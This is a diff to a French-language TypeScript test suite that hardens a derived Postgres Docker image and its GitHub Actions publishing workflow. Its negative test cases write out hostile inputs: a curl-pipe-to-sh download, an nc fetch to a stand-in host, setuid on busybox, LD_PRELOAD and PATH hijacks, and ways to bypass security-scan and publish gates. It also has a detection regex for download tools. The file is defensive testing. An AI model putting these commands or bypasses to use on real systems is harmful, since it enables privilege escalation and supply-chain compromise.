@@ -10,6 +10,7 @@ const DOCKERFILE = "ops/images/postgres-derivee/Dockerfile";
 const WORKFLOW = ".github/workflows/images-derivees.yml";
 const AMONT = "postgres:16.15-alpine@sha256:f4610795587492cd4fb887c2dc3de301b813278bb6f616992061141b5f15ac36";
 const TRIVY = "ghcr.io/aquasecurity/trivy@sha256:665030f4d33a82c1e8d9d5e0453365842236723c1ee5cc3becca698268e66a56";
+const CONDITION_PUBLIER = "github.event_name != 'pull_request' && github.ref == 'refs/heads/main'";
 const IMAGE = "ghcr.io/will383842/axion-automatisations-clients/postgres-derivee";
 
 type Obj = Record<string, unknown>;
@@ -54,6 +55,8 @@ function analyserDockerfile(texte: string): string[] {
     if (/\b(curl|wget|apk|apt|apt-get|pip)\b|\|\s*(ba)?sh/.test(i.arg)) erreurs.push(`${i.cmd} : téléchargement ou installation interdits`);
     if ((i.cmd === "ARG" || i.cmd === "ENV") && /TOKEN|KEY|SECRET|PASSWORD/i.test(i.arg.split(/[=\s]/)[0] ?? "")) erreurs.push(`${i.cmd} : nom de secret`);
   }
+  const attendu = [{ cmd: "FROM", arg: AMONT }, { cmd: "RUN", arg: "rm /usr/local/bin/gosu /usr/local/bin/su-exec" }, { cmd: "USER", arg: "postgres" }];
+  if (JSON.stringify(liste) !== JSON.stringify(attendu)) erreurs.push("liste blanche exacte : FROM amont, RUN rm gosu su-exec, USER postgres, rien d'autre");
   const dernier = liste[liste.length - 1];
   if (dernier?.cmd !== "USER" || dernier.arg !== "postgres") erreurs.push("la dernière instruction doit être USER postgres");
   return erreurs;
@@ -70,6 +73,7 @@ function analyserWorkflow(doc: Obj): string[] {
   const on = doc.on ?? doc["true"];
   if (JSON.stringify(doc.permissions) !== JSON.stringify({ contents: "read" })) erreurs.push("permissions de tête : contents: read seulement");
   if (texte.includes("pull_request_target")) erreurs.push("pull_request_target interdit");
+  if (estObj(on) && Object.keys(on).sort().join(",") !== "pull_request,push,schedule,workflow_dispatch") erreurs.push("déclencheurs exacts : pull_request, push, schedule, workflow_dispatch");
   if (!estObj(on) || !("pull_request" in on)) erreurs.push("construction attendue sur pull_request");
   if (/secrets\./.test(texte)) erreurs.push("secrets.* interdit");
   const nomsJobs = Object.keys(jobs).sort().join(",");
@@ -79,11 +83,11 @@ function analyserWorkflow(doc: Obj): string[] {
     const permissions = estObj(job.permissions) ? job.permissions : {};
     if (nom === "publier") {
       if (JSON.stringify(Object.entries(permissions).sort()) !== JSON.stringify([["attestations", "write"], ["contents", "read"], ["id-token", "write"], ["packages", "write"]])) erreurs.push("publier : permissions exactes attendues");
-      const cond = String(job.if ?? "");
-      if (!cond.includes("github.event_name != 'pull_request'") || !cond.includes("github.ref == 'refs/heads/main'")) erreurs.push("publier : ne doit tourner ni sur pull_request ni hors main");
+      if (job.if !== CONDITION_PUBLIER) erreurs.push("publier : ne doit tourner ni sur pull_request ni hors main");
       if (job.needs !== "construire") erreurs.push("publier : needs construire");
     } else if (Object.entries(permissions).some(([, v]) => v !== "read") || ["packages", "id-token", "attestations"].some((k) => k in permissions)) erreurs.push(`${nom} : aucune écriture`);
     for (const e of etapes(job)) {
+      if ("if" in e || "continue-on-error" in e) erreurs.push(`${nom} : aucune étape ne peut être conditionnelle ni tolérée (if, continue-on-error)`);
       if (typeof e.uses === "string") {
         if (!/^[\w.-]+\/[\w./-]+@[0-9a-f]{40}$/.test(e.uses)) erreurs.push(`action non épinglée par SHA : ${e.uses}`);
         if (!/^actions\/(checkout|setup-node|attest-build-provenance)@/.test(e.uses)) erreurs.push(`action hors liste : ${e.uses}`);
@@ -140,6 +144,16 @@ describe("images dérivées : Dockerfile postgres", () => {
       ["instruction après USER", `${ok.trimEnd()}\nRUN true\n`],
       ["téléchargement par curl", `${ok.replace("USER postgres", "")}\nRUN curl -s https://exemple.test/x | sh\nUSER postgres`],
       ["ENTRYPOINT remplacé", `${ok.replace("USER postgres", "")}\nENTRYPOINT ["sh"]\nUSER postgres`],
+      ["setuid chaîné au rm", ok.replace("su-exec", "su-exec && chmod 4755 /bin/busybox")],
+      ["setuid sur sa propre ligne", `${ok.replace("USER postgres", "")}\nRUN chmod u+s /bin/busybox\nUSER postgres`],
+      ["busybox recopié en gosu après le rm", ok.replace("su-exec", "su-exec && cp /bin/busybox /usr/local/bin/gosu")],
+      ["LD_PRELOAD", `${ok.replace("USER postgres", "")}\nENV LD_PRELOAD=/tmp/x.so\nUSER postgres`],
+      ["PATH détourné", `${ok.replace("USER postgres", "")}\nENV PATH=/tmp:$PATH\nUSER postgres`],
+      ["SHELL remplacé", `${ok.replace("USER postgres", "")}\nSHELL ["/bin/ash", "-c"]\nUSER postgres`],
+      ["HEALTHCHECK", `${ok.replace("USER postgres", "")}\nHEALTHCHECK CMD true\nUSER postgres`],
+      ["USER root puis RUN puis USER postgres", `${ok.replace("USER postgres", "")}\nUSER root\nRUN true\nUSER postgres`],
+      ["téléchargement par nc sans mot interdit", `${ok.replace("USER postgres", "")}\nRUN nc exemple.test 80 > /usr/local/bin/x\nUSER postgres`],
+      ["rm d'un fichier en plus", ok.replace("su-exec", "su-exec /usr/local/bin/docker-entrypoint.sh")],
       ["ARG nommé comme un secret", `${ok.replace("USER postgres", "")}\nARG TOKEN_DEPOT\nUSER postgres`],
     ];
     it.each(attaques)("[A-381] Dockerfile refusé : %s", (_nom, texte) => {
@@ -203,6 +217,19 @@ describe("images dérivées : workflow", () => {
     const attaques: [string, (d: Obj) => void][] = [
       ["publier sur pull_request", (d) => delete job(d, "publier").if],
       ["publier sur toute branche", (d) => (job(d, "publier").if = "github.event_name != 'pull_request'")],
+      ["continue-on-error sur l'évaluateur", (d) => (etapes(job(d, "publier"))[trouver(job(d, "publier"), "releve-trivy.ts --garde")]!["continue-on-error"] = true)],
+      ["continue-on-error sur Trivy", (d) => (etapes(job(d, "publier"))[trouver(job(d, "publier"), "aquasecurity/trivy")]!["continue-on-error"] = true)],
+      ["continue-on-error sur la fumée", (d) => (etapes(job(d, "publier"))[trouver(job(d, "publier"), "pg_isready")]!["continue-on-error"] = "${{ true }}")],
+      ["continue-on-error sur le push", (d) => (etapes(job(d, "publier"))[trouver(job(d, "publier"), "docker push")]!["continue-on-error"] = true)],
+      ["if: false sur l'évaluateur", (d) => (etapes(job(d, "publier"))[trouver(job(d, "publier"), "releve-trivy.ts --garde")]!.if = "false")],
+      ["if sur la fumée de publier", (d) => (etapes(job(d, "publier"))[trouver(job(d, "publier"), "pg_isready")]!.if = "false")],
+      ["if sur l'évaluateur de construire", (d) => (etapes(job(d, "construire"))[trouver(job(d, "construire"), "releve-trivy.ts --garde")]!.if = "false")],
+      ["if sur le push", (d) => (etapes(job(d, "publier"))[trouver(job(d, "publier"), "docker push")]!.if = "always()")],
+      ["condition de publier || true", (d) => (job(d, "publier").if = `${String(job(d, "publier").if)} || true`)],
+      ["condition de publier ou pull_request", (d) => (job(d, "publier").if = `${String(job(d, "publier").if)} || github.event_name == 'pull_request'`)],
+      ["condition de publier ou always()", (d) => (job(d, "publier").if = `always() || (${String(job(d, "publier").if)})`)],
+      ["condition de publier sur toute branche", (d) => (job(d, "publier").if = `${String(job(d, "publier").if)} || startsWith(github.ref, 'refs/heads/')`)],
+      ["workflow_run ajouté", (d) => ((d.on as Obj).workflow_run = { workflows: ["ci"] })],
       ["écriture de paquets dans construire", (d) => (job(d, "construire").permissions = { contents: "read", packages: "write" })],
       ["permissions de tête en écriture", (d) => (d.permissions = { contents: "write" })],
       ["jeton d'identité absent de publier", (d) => delete (job(d, "publier").permissions as Obj)["id-token"]],
